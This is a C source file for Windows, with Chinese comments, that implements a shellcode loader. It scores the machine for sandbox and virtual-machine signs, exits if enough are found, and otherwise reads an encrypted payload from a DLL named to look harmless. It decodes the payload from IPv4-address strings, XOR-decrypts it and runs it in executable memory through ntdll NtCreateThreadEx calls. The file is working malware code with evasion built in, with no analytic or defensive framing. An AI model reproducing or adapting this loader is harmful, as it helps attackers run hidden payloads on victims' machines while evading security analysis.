#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <psapi.h>

// DLL导出函数声明
typedef char** (*GetPayloadDataFunc)();
typedef size_t (*GetPayloadSizeFunc)();
typedef const char* (*GetEncryptionKeyFunc)();

BOOL check_cpu_cores() {
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    return (sysInfo.dwNumberOfProcessors <= 2);
}

BOOL check_memory_size() {
    MEMORYSTATUSEX memStatus;
    memStatus.dwLength = sizeof(memStatus);
    GlobalMemoryStatusEx(&memStatus);
    return (memStatus.ullTotalPhys < 2ULL * 1024 * 1024 * 1024);
}

BOOL check_vm_processes() {
    const char* vm_processes[] = {
        "vmtoolsd.exe", "vmwaretray.exe", "vmwareuser.exe",
        "vboxservice.exe", "vboxtray.exe", "xenservice.exe"
    };

    DWORD processes[1024], cbNeeded;
    if (EnumProcesses(processes, sizeof(processes), &cbNeeded)) {
        for (DWORD i = 0; i < cbNeeded / sizeof(DWORD); i++) {
            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processes[i]);
            if (hProcess) {
                char processName[MAX_PATH];
                if (GetModuleBaseNameA(hProcess, NULL, processName, MAX_PATH)) {
                    for (int j = 0; j < sizeof(vm_processes) / sizeof(vm_processes[0]); j++) {
                        if (strcmp(processName, vm_processes[j]) == 0) {
                            CloseHandle(hProcess);
                            return TRUE;
                        }
                    }
                }
                CloseHandle(hProcess);
            }
        }
    }
    return FALSE;
}

BOOL check_user_interaction() {
    LASTINPUTINFO lii;
    lii.cbSize = sizeof(LASTINPUTINFO);
    if (GetLastInputInfo(&lii)) {
        DWORD idle_time = (GetTickCount() - lii.dwTime) / 1000;
        return (idle_time > 300);
    }
    return FALSE;
}

BOOL check_debugger() {
    return IsDebuggerPresent();
}

BOOL check_time_acceleration() {
    DWORD start_time = GetTickCount();
    Sleep(5000);
    DWORD actual_time = GetTickCount() - start_time;
    return (actual_time < 4000);
}

BOOL is_sandbox() {
    int score = 0;
    if (check_cpu_cores()) score++;
    if (check_memory_size()) score++;
    if (check_vm_processes()) score++;
    if (check_user_interaction()) score++;
    if (check_debugger()) score++;
    if (check_time_acceleration()) score++;
    return (score >= 3);
}

LONG WINAPI VEHHandler(PEXCEPTION_POINTERS ExceptionInfo) {
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION) {
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

void decrypt_random_data(unsigned char* random_data, size_t size, const char* key, size_t key_size) {
    for (size_t i = 0; i < size; i++) {
        random_data[i] ^= (unsigned char)key[i % key_size];
    }
}

void deobfuscate_ipv4(unsigned char* random_data, size_t size, char** ipv4_array, size_t ipv4_count) {
    size_t offset = 0;
    for (size_t i = 0; i < ipv4_count && offset < size; i++) {
        unsigned char a, b, c, d;
        sscanf(ipv4_array[i], "%hhu.%hhu.%hhu.%hhu", &a, &b, &c, &d);
        random_data[offset] = a;
        if (offset + 1 < size) random_data[offset + 1] = b;
        if (offset + 2 < size) random_data[offset + 2] = c;
        if (offset + 3 < size) random_data[offset + 3] = d;
        offset += 4;
    }
}

int main() {
    if (is_sandbox()) {
        ExitProcess(0);
    }

    AddVectoredExceptionHandler(1, VEHHandler);

    // 动态加载DLL（使用不明显的名称）
    HMODULE payload_dll = LoadLibraryA("helper.dll");
    if (!payload_dll) {
        return 0;
    }

    // 获取导出函数
    GetPayloadDataFunc GetPayloadData = (GetPayloadDataFunc)GetProcAddress(payload_dll, "GetPayloadData");
    GetPayloadSizeFunc GetPayloadSize = (GetPayloadSizeFunc)GetProcAddress(payload_dll, "GetPayloadSize");
    GetEncryptionKeyFunc GetEncryptionKey = (GetEncryptionKeyFunc)GetProcAddress(payload_dll, "GetEncryptionKey");

    if (!GetPayloadData || !GetPayloadSize || !GetEncryptionKey) {
        FreeLibrary(payload_dll);
        return 0;
    }

    // 动态获取payload数据
    char** ipv4_array = GetPayloadData();
    size_t ipv4_count = GetPayloadSize();
    const char* key = GetEncryptionKey();

    // 计算shellcode大小 (每个IPv4 = 4字节)
    size_t shellcode_size = ipv4_count * 4;

    unsigned char* random_buffer = (unsigned char*)VirtualAlloc(NULL, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!random_buffer) {
        FreeLibrary(payload_dll);
        return 0;
    }

    deobfuscate_ipv4(random_buffer, shellcode_size, ipv4_array, ipv4_count);
    decrypt_random_data(random_buffer, shellcode_size, key, strlen(key));

    // 释放DLL（数据已提取到内存）
    FreeLibrary(payload_dll);

    // Syscall执行
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    typedef NTSTATUS(WINAPI* NtAllocateVirtualMemory_t)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
    typedef NTSTATUS(WINAPI* NtWriteVirtualMemory_t)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
    typedef NTSTATUS(WINAPI* NtCreateThreadEx_t)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);

    NtAllocateVirtualMemory_t pNtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetProcAddress(ntdll, "NtAllocateVirtualMemory");
    NtWriteVirtualMemory_t pNtWriteVirtualMemory = (NtWriteVirtualMemory_t)GetProcAddress(ntdll, "NtWriteVirtualMemory");
    NtCreateThreadEx_t pNtCreateThreadEx = (NtCreateThreadEx_t)GetProcAddress(ntdll, "NtCreateThreadEx");

    void* exec_mem = NULL;
    SIZE_T mem_size = shellcode_size;
    pNtAllocateVirtualMemory(GetCurrentProcess(), &exec_mem, 0, &mem_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    pNtWriteVirtualMemory(GetCurrentProcess(), exec_mem, random_buffer, shellcode_size, NULL);

    HANDLE hThread = NULL;
    pNtCreateThreadEx(&hThread, 0x1FFFFF, NULL, GetCurrentProcess(), exec_mem, NULL, 0, 0, 0, 0, NULL);

    if (hThread) {
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    }

    VirtualFree(random_buffer, 0, MEM_RELEASE);
    return 0;
}